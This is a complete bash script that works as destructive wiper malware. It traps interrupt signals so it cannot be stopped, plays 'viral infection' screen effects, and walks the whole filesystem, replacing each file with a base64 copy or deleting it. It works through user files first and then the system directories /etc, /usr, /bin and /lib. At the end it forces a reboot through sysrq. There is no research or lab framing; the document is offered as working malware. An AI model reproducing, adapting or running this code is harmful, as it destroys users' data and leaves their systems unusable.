#!/bin/bash

# --- VITAL SIGN PROTECTION ---
PROTECTED="base64|rm|sh|sleep|ld-linux|libc.so|libdl.so|grep|wc|find|xargs|printf|seq|bash|head|libtinfo|tput"
MAJOR_DIRS="/etc|/bin|/sbin|/lib|/usr|/boot"

# --- LOCK DOWN & PERSISTENCE ---
# If they try to Ctrl+C, it clears the screen and keeps the visuals going
stop_exit() {
    echo -e "\e[H\e[J\e[1;31m [!] ATTEMPTED EXIT BLOCKED: INFECTION PERMANENT \e[0m"
    sleep 0.2
}
trap stop_exit SIGINT SIGTSTP SIGHUP

# --- THE OMEGA VISUAL ENGINE ---
visual_engine() {
    local cols=$(tput cols)
    local lines=$(tput lines)
    
    while true; do
        # 1. FIREWORKS / EXPLOSIONS
        local fx=$((RANDOM % cols))
        local fy=$((RANDOM % lines / 2))
        echo -e "\e[${fy};${fx}H\e[1;33m*\e[0m"
        echo -e "\e[$((fy-1));${fx}H\e[1;31m.\e[$((fy+1));${fx}H.\e[${fy};$((fx-2))H. .\e[0m"
        
        # 2. POPUP "VIRAL INFECTION" WINDOWS
        if [[ $((RANDOM % 4)) -eq 0 ]]; then
            local wx=$((RANDOM % (cols - 22)))
            local wy=$((RANDOM % (lines - 6)))
            echo -e "\e[${wy};${wx}H\e[41;97m  VIRAL INFECTION  \e[0m"
            echo -e "\e[$((wy+1));${wx}H\e[47;30m|                | \e[0m"
            echo -e "\e[$((wy+2));${wx}H\e[47;30m|  CRITICAL FAIL  | \e[0m"
            echo -e "\e[$((wy+3));${wx}H\e[47;30m|________________| \e[0m"
            (sleep 0.6 && echo -e "\e[${wy};${wx}H                \e[$((wy+1));${wx}H                \e[$((wy+2));${wx}H                \e[$((wy+3));${wx}H                ") &
        fi
        
        # 3. THE "SCREEN MELT" (Random characters falling)
        local mx=$((RANDOM % cols))
        echo -e "\e[1;${mx}H\e[1;32m$(head -c 1 /dev/urandom | base64 | head -c 1)\e[0m"
        
        # 4. RANDOM MEMORY CORRUPTION (Screen Ripping)
        echo -e "\e[$(($RANDOM%lines));$(($RANDOM%cols))H\e[1;$(($RANDOM%7+31))m$(head -c 12 /dev/urandom 2>/dev/null | base64 | head -c 15)"
        
        # 5. BIT-SHREDDER SCAN LINE
        echo -e "\e[$((RANDOM%lines));0H\e[1;30m$(printf '%.0s#' $(seq 1 $cols))\e[0m"
        
        sleep 0.05
    done
}

# --- INITIALIZATION ---
tput smcup # Fullscreen mode
clear
echo -e "\e[1;31m[!] KERNEL CORRUPTION DETECTED. BYPASSING USER CONTROLS.\e[0m"
sleep 1

# REAL PERCENTAGE SETUP
TOTAL_FILES=$(find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f -print 2>/dev/null | wc -l)
PROGRESS_TRACKER="/tmp/shred_count"
echo 0 > "$PROGRESS_TRACKER"

visual_engine &
VISUAL_PID=$!

# --- DESTRUCTION ENGINE ---
destroy_batch() {
    for FILE in "$@"; do
        if base64 "$FILE" > "${FILE}.b64" 2>/dev/null && rm "$FILE" 2>/dev/null; then
             echo 1 >> "$PROGRESS_TRACKER"
        else
            rm -f "$FILE" 2>/dev/null && echo 1 >> "$PROGRESS_TRACKER"
        fi
    done
}
export -f destroy_batch
export PROGRESS_TRACKER

(
  # Phase 1: Userland
  find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -regextype posix-extended -not -regex ".*($MAJOR_DIRS|$PROTECTED).*" -type f -print0 2>/dev/null | xargs -0 -P $(nproc) -n 35 bash -c 'destroy_batch "$@"' _
  
  # Phase 2: System Core
  find /etc /usr /bin /lib -regextype posix-extended -not -regex ".*($PROTECTED).*" -type f -print0 2>/dev/null | xargs -0 -P $(nproc) -n 35 bash -c 'destroy_batch "$@"' _
) &

# --- HUD & REAL-TIME PROGRESS ---
while true; do
    CURRENT_COUNT=$(wc -l < "$PROGRESS_TRACKER" 2>/dev/null || echo 0)
    [[ $TOTAL_FILES -eq 0 ]] && TOTAL_FILES=1
    PERCENT=$(( 100 * CURRENT_COUNT / TOTAL_FILES ))
    [[ $PERCENT -gt 100 ]] && PERCENT=100

    filled=$(( PERCENT / 2 ))
    empty=$(( 50 - filled ))
    
    # Stay at the bottom of the screen regardless of the glitching
    printf "\e[s\e[$(tput lines);0H\e[1;97m\e[41m INFECTION STATUS: [%-50s] %d%% (%d/%d) \e[0m\e[u" "$(printf '#%.0s' $(seq 1 $filled 2>/dev/null))" "$PERCENT" "$CURRENT_COUNT" "$TOTAL_FILES"
    
    if [ "$PERCENT" -ge 100 ]; then break; fi
    sleep 0.1
done

# --- THE FINALE ---
kill -9 $VISUAL_PID >/dev/null 2>&1
tput rmcup # Exit fullscreen mode
clear
echo -e "\e[1;31m\n\n     FATAL SYSTEM ERROR. ALL DATA ENCODED. REBOOTING...     \n\n\e[0m"
sleep 2

# Forced Reboot
echo 1 > /proc/sys/kernel/sysrq 2>/dev/null
echo b > /proc/sysrq_trigger 2>/dev/null
reboot -f
